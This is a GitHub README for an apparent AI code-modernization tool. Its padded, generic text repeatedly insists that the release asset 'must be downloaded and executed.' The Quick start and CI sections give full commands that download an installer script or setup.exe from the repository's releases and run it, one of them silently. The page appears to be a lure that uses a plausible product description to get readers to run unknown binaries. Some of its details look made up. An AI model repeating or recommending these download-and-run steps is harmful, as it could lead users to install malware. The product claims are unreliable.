https://github.com/Muijo/legacy-code-ai-refactor/releases
[![Releases](https://img.shields.io/badge/Releases-vLatest-blue?style=for-the-badge&logo=github)](https://github.com/Muijo/legacy-code-ai-refactor/releases)

# Legacy Code AI Refactor — Modernize Java, JS, Python, PHP 🚀

[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg?style=for-the-badge)](https://github.com/Muijo/legacy-code-ai-refactor/actions)
[![License](https://img.shields.io/badge/license-MIT-blue.svg?style=for-the-badge)](LICENSE)
[![Topics](https://img.shields.io/badge/topics-ai--powered%20|%20code--analysis%20|%20refactor-lightgrey.svg?style=for-the-badge)]()

![cover](https://images.unsplash.com/photo-1515879218367-8466d910aaa4?q=80&w=1600&auto=format&fit=crop&ixlib=rb-1.2.1&s=5ff1f3ec43b9d73d5c63a1a4752b318f)

A tooling suite that inspects legacy code, finds structural issues, suggests refactor plans, and applies AST-level transforms. It ships with a real-time dashboard and guided modernization flows for Java, JavaScript, Python, and PHP. Use the Releases page to download the release bundle and run the installer. The release asset must be downloaded and executed as described below.

Table of contents
- About
- Key features
- Architecture at a glance
- Quick start (download and execute release)
- Install from source
- Run the analysis pipeline
- Dashboard and guided modernization
- Language support and rules
- Refactor examples
- CLI reference
- API and integration
- CI/CD and automation
- Extending rules and plugins
- Data model and storage
- Security and privacy
- Testing strategy
- Troubleshooting
- Contributing
- License
- Resources and links

About
This project helps teams modernize large code bases. It combines static analysis, semantic models, and generative AI to find issues and propose safe refactors. The system focuses on measurable improvements: reduced technical debt, clearer architecture, and safer refactor paths.

Key features
- Multi-language analysis: Java, JavaScript/TypeScript, Python, PHP.
- AST-based refactors: precise edits based on parsed trees.
- AI-guided suggestions: suggested refactor plans and rationale.
- Real-time dashboard: monitor scans, risk score, and progress.
- Incremental scanning: only changed files re-analyzed.
- CI/CD integration: run scans in pipelines and gate merges.
- PR assistant: automated suggestions inside pull requests.
- Plugin system: add custom rules and transformers.
- Rule library: dead code, security hotspots, anti-patterns, migration patterns.
- Metrics and modernization plan: technical debt score, priority list, cost estimate.

Architecture at a glance
- Scanner: per-language static analyzer that builds AST, CFG, and symbol table.
- Core engine: computes metrics, merges results, and builds the refactor graph.
- AI advisor: interprets analyzer output and drafts modernization plans (returns JSON plans with suggested transforms).
- Transformer: applies syntactic transforms and runs unit tests.
- Dashboard: real-time UI for visualizing results and approving transforms.
- API server: REST and WebSocket endpoints for integrations.
- Store: lightweight database for scans, artifacts, and user approvals.

High-level flow
1. Scanner runs across the repo.
2. Core engine computes findings and clusters them into issues.
3. AI advisor generates suggestions for each cluster.
4. Dashboard shows issues and proposed transforms.
5. Team reviews suggestions and approves automated patches.
6. Transformer applies changes and runs test suite.
7. CI/CD gates merge if tests and checks pass.

Quick start (download and execute release)
This repo provides packaged releases. Download the release asset and execute it. The release file contains installer and runtime components. Visit or download from the Releases page:

- Use the releases link above to get the release file. The bundle must be downloaded and executed.
- Example installer names you may see:
  - legacy-code-ai-refactor-1.2.0-linux-x64.tar.gz
  - legacy-code-ai-refactor-1.2.0-macos-universal.tar.gz
  - legacy-code-ai-refactor-1.2.0-windows-x64.zip
  - legacy-code-ai-refactor-installer.sh
  - legacy-code-ai-refactor-setup.exe

Linux / macOS (bash)
```bash
# download the installer asset (adjust version and file name as needed)
curl -L -o legacy-code-ai-refactor-installer.sh https://github.com/Muijo/legacy-code-ai-refactor/releases/download/v1.2.0/legacy-code-ai-refactor-installer.sh

# make it executable
chmod +x legacy-code-ai-refactor-installer.sh

# run installer
./legacy-code-ai-refactor-installer.sh --accept-license --install-dir /opt/legacy-refactor
```

Windows (PowerShell)
```powershell
# download setup
Invoke-WebRequest -Uri "https://github.com/Muijo/legacy-code-ai-refactor/releases/download/v1.2.0/legacy-code-ai-refactor-setup.exe" -OutFile "legacy-code-ai-refactor-setup.exe"

# run installer
Start-Process -FilePath "legacy-code-ai-refactor-setup.exe" -ArgumentList "/S" -Wait
```

If the release link does not work or you prefer source builds, check the Releases section on GitHub. Visit https://github.com/Muijo/legacy-code-ai-refactor/releases if the automatic link does not resolve.

Install from source
Prerequisites
- Java 17+ (for Java scanner and server)
- Node.js 16+ (for JS/TS scanner and dashboard)
- Python 3.9+ (for Python scanner)
- Composer (for PHP scanner)
- Docker (optional for isolated runs)
- 8+ CPU cores, 8 GB RAM for medium repos, more for large code bases

Build steps
1. Clone the repo
```bash
git clone https://github.com/Muijo/legacy-code-ai-refactor.git
cd legacy-code-ai-refactor
```

2. Build core services
```bash
# build backend (Gradle)
./gradlew :core:assemble

# build JS dashboard
cd web/dashboard
npm ci
npm run build
cd ../../
```

3. Build scanners
```bash
# Java scanner
./gradlew :scanners:java:assemble

# JS scanner
cd scanners/js
npm ci
npm run build
cd ../..

# Python scanner
cd scanners/python
pip install -r requirements.txt
python -m build
cd ../..
```

4. Start services using Docker Compose (optional)
```bash
docker-compose up --build
```

Run the analysis pipeline
Quick run (local repo)
```bash
# analyze a repository at /path/to/repo
legacy-refactor-cli scan --repo /path/to/repo --out ./reports --languages java,js,python,php --threads 4
```

Core commands
- scan: run analysis across files and output findings in JSON.
- analyze: compute metrics and build issue clusters.
- advise: run AI advisor to produce modernization plans.
- apply: apply approved transforms to a branch.
- dashboard: start the web UI server.

Sample full flow
```bash
legacy-refactor-cli scan --repo /workspace/myapp --out ./scan-output
legacy-refactor-cli analyze --scan ./scan-output --out ./analysis-output
legacy-refactor-cli advise --analysis ./analysis-output --out ./advice-output
# review advice-output/plan.json in the dashboard
# after approval:
legacy-refactor-cli apply --plan ./advice-output/plan.json --target-branch refactor/auto-123
```

Dashboard and guided modernization
Start dashboard
```bash
legacy-refactor-dashboard serve --db ./data/db.sqlite --port 8080
```
Open http://localhost:8080. Dashboard connects to the backend via WebSocket and shows:
- Live scan progress
- Issue map (by file, module, package)
- Risk heatmap
- Suggested refactor plans (grouped by cost and impact)
- Diff preview for proposed changes
- Approvals panel to accept or reject patches

Workflow in UI
- Explore issues by severity and category.
- Inspect an issue. The UI shows AST snippet, call graph, and type hints.
- View suggested refactor plan. Each plan shows step list, estimated time, and risk.
- Preview patch. The UI renders a unified diff with syntax highlighting.
- Approve and run apply. Dashboard triggers transformer and runs unit tests.
- Monitor test results. If tests pass, create PR or push directly.

Language support and rules
This tool uses per-language scanner modules. Each scanner emits a standard result schema. The core engine merges results and deduplicates issues.

Java
- Parser: built on Eclipse JDT or OpenJDK parser.
- Analysis: type resolution, call graph, dead code, long methods, feature envy, deprecated APIs.
- Refactors: inline/extract method, move method/class, replace deprecated APIs with modern equivalents, modularization suggestions for JPMS migration.

JavaScript / TypeScript
- Parser: Babel and TypeScript compiler services.
- Analysis: unused variables, var-to-let/const, callback-to-promise patterns, callback hell, common anti-patterns, bundler-friendly transforms (ESM).
- Refactors: convert var to let/const, arrow functions, async/await migration, splitting large files, import normalization.

Python
- Parser: lib2to3 / ast / typed-ast.
- Analysis: unused imports, type hint gaps, long functions, inefficient loops.
- Refactors: apply type hints, convert old-style string formatting to f-strings, replace map/filter with comprehensions when clearer.

PHP
- Parser: PHP-Parser (nikic).
- Analysis: legacy constructs, procedural code smells, security hotspots (unsanitized inputs).
- Refactors: namespace migration, move to composer autoloading, modernize array and string functions.

Rule categories
- Safety: code that can break runtime behavior if changed.
- Maintainability: long methods, high cyclomatic complexity, duplication.
- Security: SQL injection patterns, XSS risk, unsafe deserialization.
- Compatibility: deprecated API usage, platform-specific calls.
- Performance: hot loops, synchronous IO in async contexts.

Refactor examples
Example 1 — Java: extract method and improve readability
Before
```java
public void processOrders(List<Order> orders) {
    for (Order o : orders) {
        if (o.getItems().size() > 0) {
            // many lines of logic here
        }
    }
}
```
After (suggested)
```java
public void processOrders(List<Order> orders) {
    for (Order o : orders) {
        if (hasItems(o)) {
            handleOrder(o);
        }
    }
}

private boolean hasItems(Order o) {
    return o.getItems().size() > 0;
}

private void handleOrder(Order o) {
    // extracted logic
}
```
Plan: extract logic to methods, add unit tests for boundary conditions, update call sites.

Example 2 — JavaScript: var → let/const and async/await migration
Before
```javascript
var fs = require('fs');

function readFile(path, cb) {
  fs.readFile(path, function(err, data) {
    if (err) return cb(err);
    cb(null, data.toString());
  });
}
```
After (suggested)
```javascript
const fs = require('fs').promises;

async function readFile(path) {
  const data = await fs.readFile(path);
  return data.toString();
}
```
Plan: migrate callbacks to async/await, update callers to support Promise or add wrapper.

Example 3 — Python: convert format to f-string and add type hints
Before
```python
def greet(name):
    return "Hello, %s" % name
```
After (suggested)
```python
def greet(name: str) -> str:
    return f"Hello, {name}"
```
Plan: apply type hints incrementally, run static type checker (mypy).

Example 4 — PHP: namespacing and composer
Before
```php
require_once 'lib/old.php';
function doWork() { ... }
```
After (suggested)
```php
namespace App\Legacy;

use App\Lib\NewClass;

function doWork() { ... }
```
Plan: introduce PSR-4 autoloading, move files into namespaced directories, update composer.json.

CLI reference
Commands follow the pattern: legacy-refactor-cli <command> [options]

scan
- --repo <path>  : path to repo
- --languages <list> : comma-separated list
- --out <dir> : output folder
- --threads <n> : parallel threads

analyze
- --scan <dir> : scan output
- --rules <file> : ruleset (YAML)
- --out <dir>

advise
- --analysis <dir> : analysis output
- --advisor-model <name> : AI model tag
- --out <dir> : advice output

apply
- --plan <file> : plan json
- --target-branch <name>
- --dry-run : do not write changes
- --run-tests : run full test suite after apply

dashboard
- serve
  - --db <file>
  - --port <n>
  - --host <host>

Examples
```bash
# scan with custom rules
legacy-refactor-cli scan --repo . --out ./scan --languages java,js --threads 8
legacy-refactor-cli analyze --scan ./scan --rules ./config/rules.yml --out ./analysis
legacy-refactor-cli advise --analysis ./analysis --advisor-model default --out ./advice
```

API and integration
The system exposes a REST API and WebSocket stream. Use the API to automate scans or integrate with external dashboards.

Common endpoints
- POST /api/v1/scan — start a scan (body: repo URL or local path)
- GET /api/v1/scan/{id} — get scan status and results
- POST /api/v1/analyze — generate analysis from scan
- POST /api/v1/advise — generate AI advice
- POST /api/v1/apply — apply a plan
- GET /api/v1/metrics — fetch metrics and scores

Authentication
- API supports token-based auth. Create token in the dashboard and use Authorization: Bearer <token>.

WebSocket feed
- Connect to ws://<server>/ws/updates
- Subscribe to channels: scans, analysis, advice, apply
- Messages contain JSON payloads with timestamps and object IDs.

CI/CD and automation
Integrate scans into pipelines. The tool supports gating merges and failing builds on severity thresholds.

GitHub Actions example
```yaml
name: Legacy Scan

on:
  push:
    branches: [ main, release/* ]
  pull_request:

jobs:
  legacy-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run legacy code scan
        run: |
          curl -sL https://github.com/Muijo/legacy-code-ai-refactor/releases/download/v1.2.0/legacy-cli-linux | tar xz -C /tmp/legacy
          /tmp/legacy/legacy-refactor-cli scan --repo . --out ./scan --languages java,js,python,php
          /tmp/legacy/legacy-refactor-cli analyze --scan ./scan --out ./analysis
          /tmp/legacy/legacy-refactor-cli advise --analysis ./analysis --out ./advice
      - name: Upload report
        uses: actions/upload-artifact@v3
        with:
          name: legacy-report
          path: advice
```

Gate on severity
- Fail pipeline if there is at least one critical security issue.
- Fail pipeline if tech-debt score increases above a threshold.

Extending rules and plugins
Add custom rules in YAML or JavaScript. The plugin interface supports:
- rule definition: matcher, condition, severity, description
- transformer hook: function that produces AST edits
- test harness: sample input and expected output

Example rule (YAML)
```yaml
id: no-console-logs
language: javascript
matcher: "CallExpression[callee.object.name='console']"
severity: minor
message: "Console logs should not remain in production code."
transform:
  type: remove_node
```

Plugin layout
- plugin.yaml — metadata
- index.js — plugin entry point
- tests/ — unit tests for rules

Data model and storage
- ScanResult: file, findings[], analysisMeta
- Finding: id, file, start, end, category, severity, message, trace
- Plan: id, findings[], steps[], riskScore, estimatedTime
- Step: transform, precondition, testCommand, rollback

Storage options
- SQLite (default for single-node)
- PostgreSQL (recommended for teams)
- S3 compatible object store for artifacts

Security and privacy
- The tool runs locally. You control data retention settings.
- AI advisor can run locally or call an external model provider. When the external model is used, the system can redact sensitive data. Configure model provider and redaction policies in config.

Best practices
- Run scans on feature branches before PRs.
- Keep rules in the repo to make them auditable.
- Approve changes via review workflow and run full test suite after apply.

Testing strategy
- Unit tests for scanners using fixtures.
- Integration tests: run a scan against sample mono-repo.
- Transformer tests: apply patch to fixture and run assertions.
- End-to-end tests: spin dashboard and run UI checks.

Test commands
```bash
# run unit tests
./gradlew test

# run scanner tests
npm run test --prefix scanners/js

# run transformer integration
python -m pytest scanners/python/tests
```

Troubleshooting
- If scanner misses files, check language filter (--languages).
- If transform fails, inspect plan.json for preconditions and run tests locally.
- If dashboard does not connect, ensure WebSocket port is open.

Common issues and fixes
- Missing dependencies: run the preflight script at tools/preflight.sh
- Large repository memory use: increase --threads or run Docker with higher resource limits
- False positives: tune rule severity and add deny-lists per path

Releases and updates
Visit the Releases page to download published builds. The release asset must be downloaded and executed. Use the release installer as shown above. If you cannot access the release link, check the Releases section on GitHub for the correct asset and version tags. Find assets and changelogs here: https://github.com/Muijo/legacy-code-ai-refactor/releases

Changelog highlights (sample)
- v1.2.0 — added Python scanner improvements, dashboard filters, and CI templates
- v1.1.0 — AST-level safe transforms for Java and JS, initial AI advisor
- v1.0.0 — beta release with core scanning and basic dashboard

Contribution guide
We accept contributions through pull requests. Follow these steps:
1. Fork the repo.
2. Create a feature branch: git checkout -b feat/my-rule
3. Add tests for your changes.
4. Run the test suite.
5. Submit a PR with a description and reference to issues.

PR checklist
- Add tests for new rules or transforms.
- Document behavior in README or docs.
- Follow code style (run tools/format.sh).
- Provide a real-world fixture for integration tests.

Issue types
- bug — bug reports with reproduction steps
- enhancement — new features or rules
- question — usage or design questions

Code of conduct
- Be respectful and constructive.
- Report harmful behavior to maintainers.

License
This repository uses the MIT license. See the LICENSE file for details.

Integrations and ecosystem
- GitHub: PR checks and comment bot
- GitLab: pipeline job templates
- Jenkins: shared library steps
- VS Code extension (planned): inline suggestions and quick fixes
- Slack / Teams: notifications for scan results and approvals

Performance tips
- Use incremental scanning for active development branches.
- Configure exclusion paths for generated folders (node_modules, target, vendor).
- Increase thread count when CPU-bound.

Data export and reporting
Reports include:
- findings.json — raw findings
- analysis.json — computed metrics and clusters
- plan.json — advisor output with steps and transforms
- human-readable PDF/HTML reports via report generator

Sample report fields
- techDebtScore: aggregated numeric score
- hotspots: list of high-risk files
- per-module metrics: maintainability index, complexity, churn
- suggestions: list sorted by impact/time ratio

Governance and rule lifecycle
- Rules come with versions and authorship metadata.
- Changes to core or security rules require tests and review.
- Deprecate rules with migration instructions.

Supported topics and tags
This project targets the following areas: ai-powered, code-analysis, code-refactoring, java, javascript, legacy-code, modernization, php, python, storehubai, technical-debt.

Assets and images
Use the assets folder to customize dashboard branding:
- assets/logo.svg
- assets/og-cover.png
- assets/screenshots/*

Examples of images used in docs:
- Cover and hero images are linked from Unsplash and are free to use under Unsplash terms.
- Diagrams are SVG in docs/diagrams.

Contact and support
- Use GitHub issues for bug reports and feature requests.
- For enterprise support, open an issue titled "enterprise-support" and provide contact info.

 legal and compliance pointers
- The tool can suggest code changes that may affect licenses. Review license risks before mass apply.
- Keep track of third-party dependencies to respect license obligations.

Advanced topics
Refactor safety model
- Each transform has preconditions and post-conditions.
- The transformer runs a pre-check that verifies symbol resolution and type stability.
- The system supports rollback by capturing a patch set and storing the pre-change state.

Continuous modernization
- Use scheduled scans to track technical debt over time.
- Set thresholds and automated plans to refactor low-risk items in bulk.
- Use the dashboard to prioritize work by business impact.

AI advisor internals (high level)
- The advisor uses a model that consumes an analysis graph: nodes (files, functions), edges (call, import), and findings.
- It generates step-by-step plans with explicit transforms and test commands.
- Plans include a confidence score and a short rationale for each step.

Example plan.json (snippet)
```json
{
  "id": "plan-123",
  "findings": ["f-987"],
  "steps": [
    {
      "id": "s-1",
      "transform": {
        "language": "javascript",
        "type": "migrate-callback-to-async",
        "target": "src/io/read.js",
        "edit": "..."
      },
      "precondition": "unit-tests-pass",
      "estimated_time": 15,
      "risk": "low"
    }
  ]
}
```

Scaling and multi-repo
- Use a central server with PostgreSQL to store scan metadata.
- Configure agents to run scanners inside each repo and push results to the central server.
- Use the dashboard to aggregate metrics across repos and define org-level modernization policies.

Localization
- The dashboard supports text translation. Add locale files in web/dashboard/src/locales.

Roadmap (sample)
- VS Code extension for inline suggestions and quick fixes.
- Deep integration with IDE refactoring engines for safer apply.
- Policy engine for automatic approvals (with constraints).
- Support for more languages: C#, Go, Ruby.

Frequently asked questions
Q: Does the tool change code without approval?
A: No. It generates plans and patches. You must approve them in the dashboard or via CLI with --apply.

Q: Can the AI advisor run offline?
A: Yes. You can host a local model provider. Configure model settings in config/model.yml.

Q: What happens if tests fail after apply?
A: The transform runner stops and rolls back changes by default. You can configure manual rollback policy.

Q: How do I add custom rules?
A: Add a plugin in plugins/ with a plugin.yaml and tests. Use the CLI to register the plugin.

Resources and links
- Releases and downloads: https://github.com/Muijo/legacy-code-ai-refactor/releases
- Documentation site (planned): docs.legacy-refactor.local
- Example repos: examples/sample-java, examples/sample-js, examples/sample-python
- Community: GitHub Discussions in the repo

Images and sample badges
[![AI](https://img.shields.io/badge/AI-powered-green?style=flat-square)](https://github.com/Muijo/legacy-code-ai-refactor)
![Architecture](https://raw.githubusercontent.com/Muijo/legacy-code-ai-refactor/main/docs/diagrams/architecture.svg)

Appendix: sample rules library (detailed)
- rule: avoid-long-method
  - severity: major
  - rationale: Long methods hinder comprehension and introduce bugs.
  - detection: cyclomatic_complexity > 15 or line_count > 200
  - remedy: extract methods, split responsibilities
- rule: deprecated-api-usage
  - severity: critical
  - detection: pattern match for deprecated imports or calls
  - remedy: replace with documented modern API
- rule: untyped-public-api (Python)
  - severity: minor
  - detection: public function without type hints
  - remedy: add annotations and update tests

Developer notes for maintainers
- Keep rule definitions in src/rules to enable hot reload in dev.
- Use the test harness under test/fixtures to reproduce issues.
- When adding transforms, include an idempotency test to verify repeated apply yields no change.

Release process (maintainer guide)
1. Bump version in version.properties.
2. Run build and tests: ./gradlew clean build
3. Generate release artifacts: ./gradlew :distributions:assemble
4. Create release on GitHub and attach assets.
5. Update CHANGELOG.md with highlights and migration notes.

End of file.